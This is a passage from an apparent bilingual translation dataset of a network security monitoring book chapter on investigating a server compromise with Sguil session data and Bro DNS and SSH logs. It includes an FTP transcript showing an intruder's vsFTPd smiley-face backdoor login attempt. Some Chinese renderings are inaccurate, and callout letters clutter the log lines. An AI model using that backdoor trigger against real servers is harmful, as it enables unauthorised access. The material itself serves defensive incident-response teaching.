- en: those passwords, he can access the system directly, rather than needing to
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这些密码，他可以直接访问系统，而不需要
- en: break into it using an exploit.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 破门而入，使用漏洞进行攻击。
- en: We now understand a good deal about this case, but is that the end of
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在对这个案例有了很好的了解，但这就是结局吗？
- en: the story?
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 故事怎么样了？
- en: '***What Else Did the Intruder Do?***'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: '***入侵者还做了什么？***'
- en: In order to determine a bit more about what happened, we need to take
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 为了进一步了解发生了什么，我们需要
- en: a closer look at two other aspects of this case. First, notice in Figure 10-8
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 仔细查看此案例的其他两个方面。首先，注意图10-8中的内容
- en: that 192.168.3.5 wasn’t the only target of 203.0.113.10\. We also see activity
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5并不是203.0.113.10的唯一目标。我们还看到活动
- en: '**222** Chapter 10'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: '**222** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: involving ports 21 and 6200 TCP to 192.168.3.13\. We generate a transcript for
    port 21 TCP to see what happened to 192.168.3.13\. Listing 10-10 shows
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 涉及端口21和6200 TCP到192.168.3.13。我们生成了一个端口21 TCP的记录，以查看192.168.3.13发生了什么。清单10-10显示了
- en: the result.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 结果。
- en: 'Sensor Name: sovm-eth1'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 传感器名称：sovm-eth1
- en: 'Timestamp: 2013-03-09 21:46:37'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 时间戳：2013-03-09 21:46:37
- en: 'Connection ID: .sovm-eth1_1362865597000002352'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 连接ID：.sovm-eth1_1362865597000002352
- en: 'Src IP: 203.0.113.10 (Unknown)'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 源IP：203.0.113.10（未知）
- en: 'Dst IP: 192.168.3.13x (Unknown)'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 目标IP：192.168.3.13x（未知）
- en: 'Src Port: 49220'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 源端口：49220
- en: 'Dst Port: 21v'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 目标端口：21v
- en: 'OS Fingerprint: 203.0.113.10:49220 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 2 hrs) OS Fingerprint: -> 192.168.3.13:21 (link: ethernet/modem)'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：203.0.113.10:49220 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]（上线：2小时）操作系统指纹：->
    192.168.3.13:21（连接：以太网/调制解调器）
- en: 'DST: 220 (vsFTPd 2.3.5)w'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: 220 (vsFTPd 2.3.5)w'
- en: 'DST:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: 'SRC: USER 1dxF:)u'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 用户 1dxF:)u'
- en: 'SRC:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC:'
- en: 'DST: 331 Please specify the password.'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: 331 请指定密码。'
- en: 'DST:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: 'SRC: PASS 0ibjZ'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 密码 0ibjZ'
- en: 'SRC:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC:'
- en: 'DST: 530 Login incorrect.y'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: 530 登录不正确.y'
- en: 'DST:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: 'DST: 500 OOPS:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: 500 OOPS:'
- en: 'DST: vsf_sysutil_recv_peek: no data'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: vsf_sysutil_recv_peek: 无数据'
- en: 'DST:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST:'
- en: '*Listing 10-10: Transcript of FTP connection from 203.0.113.10 to 192.168.3.13*'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单10-10：从203.0.113.10到192.168.3.13的FTP连接记录*'
- en: We can see that the intruder tried the same smiley face attack u against
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到入侵者尝试了相同的笑脸攻击u针对
- en: an FTP server v and w on 192.168.3.13 x, but that he received a rude Login
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: FTP服务器v和w在192.168.3.13 x上，但他收到了一个粗鲁的登录
- en: incorrect error y in return. The attack failed. Furthermore, according to
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 错误y返回不正确。攻击失败。此外，根据
- en: the NSM session data, no connections were made to port 6200 TCP on
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: NSM会话数据中，没有连接到端口6200 TCP
- en: 192.168.3.13, which tells us that 192.168.3.13 was not affected by this attack.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13，告诉我们192.168.3.13没有受到此攻击的影响。
- en: Now we must determine what else may have happened to 192.168.3.5\.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们必须确定192.168.3.5可能还发生了什么。
- en: We saw the intruder connect to the FTP server and interact with a back-
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到入侵者连接到FTP服务器，并与一个后端互动
- en: door. Did he do anything beyond that? To answer this question, we run a
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 门口。他有做其他事情吗？为了回答这个问题，我们运行一个
- en: new session data query for all sessions involving the victim 192.168.3.5, as
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 针对涉及受害者192.168.3.5的所有会话，进行新的会话数据查询，如下所示
- en: shown in Listing 10-11\. The results are shown in Figure 10-11\.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 如清单10-11所示，结果显示在图10-11中。
- en: WHERE sancp.start_time > '2013-03-09' AND sancp.src_ip = INET_
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: WHERE sancp.start_time > '2013-03-09' AND sancp.src_ip = INET_
- en: ATON('192.168.3.5') AND dst_port!=137 AND dst_port!=138
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: ATON('192.168.3.5') AND dst_port!=137 AND dst_port!=138
- en: '*Listing 10-11: Search syntax for session data involving 192.168.3.5*'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单10-11：涉及192.168.3.5的会话数据查询语法*'
- en: When running this query, I added commands to ignore ports 137 and
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行此查询时，我添加了命令来忽略端口137和
- en: 138 because when I first reviewed the data, I saw many irrelevant session
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 138，因为当我第一次查看数据时，我看到许多不相关的会话
- en: records for these Windows services. Because they are not germane to this
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 这些Windows服务的记录。因为它们与此
- en: incident, I’ve removed them from the output shown in Figure 10-11\.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 事件中，我已经将它们从图10-11中显示的输出中移除。
- en: Server-side Compromise **223**
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端被攻破 **223**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 131](index-258_1.png)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![图片131](index-258_1.png)'
- en: '*Figure 10-11: Session data for 192.168.3.5*'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-11：192.168.3.5的会话数据*'
- en: We’ve seen some of this activity in earlier results, but our focus here
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在早期的结果中看到了一些这种活动，但我们在这里关注的
- en: is 192.168.3.5, not 203.0.113.10\. The most interesting new records involve
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 是192.168.3.5，而不是203.0.113.10。最有趣的新记录涉及
- en: 'two new IP addresses in the 203.0.113.0/24 net block: 203.0.113.77 and'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在203.0.113.0/24网段中，两个新的IP地址：203.0.113.77和
- en: 203.0.113.4\. These two IP addresses appear in the session records begin-
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.4。这两个IP地址出现在会话记录中，开始时-
- en: ning at 2013-03-10 01:59:43\. Apparently, our original intruder is either
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-10 01:59:43 开始的日志。显然，我们的原始入侵者要么是
- en: cooperating with colleagues or he controls those systems!
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 与同事合作，或者他控制着这些系统！
- en: I recommend creating at least notional diagrams of systems involved in
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 我建议至少创建涉及系统的概念性图表
- en: NSM when trying to understand the scope of an incident. You will not iden-
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 在试图理解事件范围时使用 NSM。你不会识别出
- en: tify all of the infrastructure between victim systems and remote attackers,
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 无法识别所有受害系统与远程攻击者之间的基础设施，
- en: but depicting them visually can help you better recognize what is happening
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 但将它们以可视化的方式展示，可以帮助你更好地识别发生了什么
- en: in real-world cases. Figure 10-12 summarizes our current understanding of
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 在实际案例中，图 10-12 总结了我们当前的理解。
- en: all of the systems involved in this case.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 涉及此案例的所有系统。
- en: '**exploring the Session data**'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: '**探索会话数据**'
- en: Let’s consider the new sessions unearthed by querying the victim IP address
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们考虑通过查询受害者 IP 地址发现的新会话
- en: 'to determine the scope of the incident, bearing in mind this simple rule:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 确定事件范围时，请记住这一简单规则：
- en: The only constant in an intrusion is the victim. Intruders may try to obfus-
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵中的唯一不变因素是受害者。入侵者可能会通过改变攻击系统来伪装
- en: cate their activities by changing attacking systems, hopping from attacking
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 通过跳转到不同的攻击系统来隐藏他们的活动
- en: platform to attacking platform; incident responders who fixate on attacker
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 从平台到攻击平台；事件响应者如果过于关注攻击者
- en: IP addresses will miss these jumps. Keep the victim in mind, and you won’t
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: IP 地址将错过这些跳跃。牢记受害者，你就不会
- en: be fooled.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 不要被愚弄。
- en: '**224** Chapter 10'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '**224** 第 10 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Intruder 1
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Internet
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网
- en: 203.0.113.10
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: NSM
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: NSM
- en: Intruder 2
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 2
- en: Intruder 3
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 3
- en: 203.0.113.77
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.77
- en: 203.0.113.4
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.4
- en: Test
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 测试
- en: Network
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 网络
- en: Tap
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 轻触
- en: Server
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器
- en: 192.168.3.5
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: Desktop
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 桌面
- en: 192.168.3.13
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13
- en: '*Figure 10-12: Systems observed in this case*'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 10-12：此案例中观察到的系统*'
- en: Notice in Figure 10-11 that we start with the three DNS queries made
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，在图 10-11 中，我们从受害者 IP 地址发出的三个 DNS 查询开始
- en: by 192.168.3.5 beginning with 2013-03-09 21:40:35\. We could use the Sguil
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 192.168.3.5 开始的日志，时间为 2013-03-09 21:40:35\。我们可以使用 Sguil
- en: console to try to generate Wireshark output for each session in order to see
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 控制台尝试为每个会话生成 Wireshark 输出，以便查看
- en: the queries and replies, but instead, we’ll refer to DNS logs captured by Bro,
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 查询和回复，但我们将引用由 Bro 捕获的 DNS 日志，
- en: stored in the */nsm/bro/logs/2013-03-09* directory. As you’ll see, the Bro logs
    are a form of transaction data and metadata.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 存储在 */nsm/bro/logs/2013-03-09* 目录中。正如你将看到的，Bro 日志是一种事务数据和元数据的形式。
- en: '***Searching Bro DNS Logs***'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '***搜索 Bro DNS 日志***'
- en: There are many ways to search Bro DNS logs for specific entries. One simple
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 有很多方法可以搜索 Bro DNS 日志中的特定条目。一种简单的方法是
- en: way is from the command line, as shown in Listing 10-12\.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 这种方式来自命令行，如列表 10-12 所示\。
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | bro-cut -d | grep 192.168.3.5 |**
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | bro-cut -d | grep 192.168.3.5 |**
- en: '**grep -v WORKGROUP**'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '**grep -v WORKGROUP**'
- en: '*-- snip --*'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: '*-- snip --*'
- en: 2013-03-09T21:40:35+0000 k3hPbe4s2H2 192.168.3.5u 60307
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-09T21:40:35+0000 k3hPbe4s2H2 192.168.3.5u 60307
- en: 192.168.3.1 53 udp 40264 2.3.168.192.in-addr.arpaw 1
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.1 53 udp 40264 2.3.168.192.in-addr.arpaw 1
- en: C_INTERNET 12 PTRv - - F F T F
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: C_INTERNET 12 PTRv - - F F T F
- en: 0 --
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 0 --
- en: 2013-03-09T21:47:08+0000 i1zTu4rfvvk 192.168.3.5x 36911
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-09T21:47:08+0000 i1zTu4rfvvk 192.168.3.5x 36911
- en: 192.168.3.1 53 udp 62798 www.google.comz 1
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.1 53 udp 62798 www.google.comz 1
- en: C_INTERNET 1 A - - F F T F
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: C_INTERNET 1 A - - F F T F
- en: 0 - -
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 0 - -
- en: 2013-03-09T21:47:18+0000 H5Wjg7kx02d 192.168.3.5y 49467
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-09T21:47:18+0000 H5Wjg7kx02d 192.168.3.5y 49467
- en: 192.168.3.1 53 udp 32005 www.google.com.localdomain{ 1
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.1 53 udp 32005 www.google.com.localdomain{ 1
- en: C_INTERNET 1 A - - F F T F
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: C_INTERNET 1 A - - F F T F
- en: 0 --
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 0 --
- en: '*Listing 10-12: DNS records logged by Bro*'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-12：Bro 记录的 DNS 记录*'
- en: Server-side Compromise **225**
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端入侵 **225**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: First, we use zcat, because the Bro log is *gzip*-compressed. Next, we pipe
    the result into bro-cut with the -d switch, which converts Bro’s native Unix
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们使用 zcat，因为 Bro 日志是 *gzip* 压缩的。接下来，我们将结果通过管道传递给 bro-cut 并使用 -d 切换，这样可以将
    Bro 的原生 Unix
- en: epoch time format into a human-readable version. We then grep for the IP
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 将时间戳格式转换为人类可读的版本。然后我们用 grep 搜索 IP
- en: address of the victim, 192.168.3.5, followed by a grep to ignore (using the
    -v
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者的地址 192.168.3.5，接着使用 grep 来忽略（使用 -v
- en: switch) any records containing WORKGROUP. Bro’s log contains DNS queries and
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 切换）任何包含 WORKGROUP 的记录。Bro 的日志包含 DNS 查询和
- en: replies, as well as logs of NetBIOS name service traffic, which we remove
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 回复，以及我们删除的 NetBIOS 名称服务流量的日志
- en: with bro-cut -d. By default, that syntax omits the headers for these records.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 bro-cut -d。默认情况下，这种语法会省略这些记录的头部。
- en: As you can see in Listing 10-12, 192.168.3.5 u queried for a PTR record v
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 如你在列表 10-12 中看到的，192.168.3.5 u 查询了一个 PTR 记录 v
- en: for *2.3.168.192.in-addr.arpa* w, which is probably not related to the intrusion.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 查询 *2.3.168.192.in-addr.arpa* w，这可能与入侵无关。
- en: Then seven minutes later, the system x y queried for *www.google.com* z and
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 然后七分钟后，系统 x y 查询了 *www.google.com* z 和
- en: '*www.google.com.localdomain* {. These last two DNS queries correspond to'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: '*www.google.com.localdomain* {. 这最后两个 DNS 查询对应于'
- en: the intruder’s attempt to ping *www.google.com*. Seeing the header in Bro logs
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者尝试 ping *www.google.com* 的记录。在 Bro 日志中看到头部
- en: can help us better understand them. One way to see header data is to avoid
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 可以帮助我们更好地理解它们。一种查看头数据的方法是避免使用
- en: piping the output through bro-cut. Instead, limit the output using the head
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 将输出通过 bro-cut 进行管道处理。相反，使用 head 限制输出
- en: command, as shown in Listing 10-13\.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 命令，如列表 10-13 所示\。
- en: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | head**
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat dns.21\:31\:10-22\:00\:00.log.gz | head**
- en: '#separator \x09'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '#separator \x09'
- en: '#set_separator ,'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: '#set_separator ,'
- en: '#empty_field (empty)'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: '#empty_field (空)'
- en: '#unset_field -'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: '#unset_field -'
- en: '#path dns'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: '#path dns'
- en: '#open 2013-03-09-21-31-10'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: '#open 2013-03-09-21-31-10'
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '#fields ts uid id.orig_h id.orig_p id.resp_h'
- en: id.resp_p proto trans_id query qclass qclass_name qtype
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: id.resp_p proto trans_id query qclass qclass_name qtype
- en: qtype_name rcode rcode_name AA TC RD RA Z
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: qtype_name rcode rcode_name AA TC RD RA Z
- en: answers TTLs
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: answers TTLs
- en: '#types time string addr port addr port enum count string'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '#types time string addr port addr port enum count string'
- en: count string count string count string bool bool bool bool
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: count string count string count string bool bool bool bool
- en: count vector[string] vector[interval]
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: count vector[string] vector[interval]
- en: '*Listing 10-13: Fields and datatypes in the Bro DNS log*'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-13：Bro DNS 日志中的字段和数据类型*'
- en: '***Searching Bro SSH Logs***'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: '***搜索 Bro SSH 日志***'
- en: Following the three DNS entries, Figure 10-11 shows 203.0.113.77 pinging
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 在三个 DNS 条目之后，图 10-11 显示了 203.0.113.77 正在 ping
- en: 192.168.3.5 via IP protocol 0, ICMP. This is the first traffic we’ve seen from
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5 通过 IP 协议 0，ICMP。这是我们看到的第一条来自
- en: 203.0.113.77\.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.77\。
- en: The next record shows traffic from 203.0.113.77 to port 22 TCP on
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个记录显示从 203.0.113.77 到 22 端口 TCP 的流量
- en: 192.168.3.5\. This is likely SSH traffic, which we can confirm by looking at
    full
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5\. 这很可能是 SSH 流量，我们可以通过查看完整的
- en: content data or by checking a few Bro logs. For example, in the *2013-03-10*
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 内容数据或通过检查几个 Bro 日志。例如，在 *2013-03-10*
- en: directory, we see the entry shown in Listing 10-14 in *ssh.log*. (Note that
    in
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 在目录中，我们看到列表 10-14 中显示的条目出现在 *ssh.log* 中。（请注意，在
- en: order to see the headers for the fields, we omit using bro-cut, as we did for
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 为了查看字段的头部，我们省略了使用 bro-cut，就像我们之前做的那样
- en: Listing 10-13.) The listing shows the entire log since it contains only one
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10-13。）该列表显示了整个日志，因为它只包含一条
- en: entry of interest.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 感兴趣的条目。
- en: '**226** Chapter 10'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '**226** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz | bro-cut -d**
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz | bro-cut -d**
- en: 2013-03-10T02:01:10+0000 8zAB2nsjjYd 203.0.113.77u 65438
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-10T02:01:10+0000 8zAB2nsjjYd 203.0.113.77u 65438
- en: 192.168.3.5v 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5v 22 成功 INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
- en: FreeBSD-20110503 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 16678 AU
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: FreeBSD-20110503 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 16678 AU
- en: '- - - -'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: '- - - -'
- en: '*Listing 10-14: SSH connection logged by Bro*'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-14：Bro 记录的 SSH 连接*'
- en: Listing 10-14 shows 203.0.113.77 u connected via SSH to 192.168.3.5 v.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10-14 显示 203.0.113.77 u 通过 SSH 连接到 192.168.3.5 v。
- en: To understand the rest of the fields, we need to know the headers for the
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 要理解其余字段，我们需要知道这些字段的头部
- en: logfile. Listing 10-15 shows the headers in a Bro SSH log followed by the
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 日志文件。列表 10-15 显示了 Bro SSH 日志中的头部，后面是
- en: same SSH record for 203.0.113.77 connecting to 192.168.3.5\.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 同样的 SSH 记录，显示 203.0.113.77 连接到 192.168.3.5\。
- en: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz**
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat ssh.02\:03\:29-03\:00\:00.log.gz**
- en: '#separator \x09'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: '#separator \x09'
- en: '#set_separator ,'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: '#set_separator ,'
- en: '#empty_field (empty)'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: '#empty_field (空)'
- en: '#unset_field -'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '#unset_field -'
- en: '#path ssh'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: '#path ssh'
- en: '#open 2013-03-10-02-03-29'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: '#open 2013-03-10-02-03-29'
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: '#fields ts uid id.orig_h id.orig_p id.resp_h'
- en: id.resp_p status direction client server resp_size
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: id.resp_p status direction client server resp_size
- en: remote_location.country_code remote_location.region remote_location.city
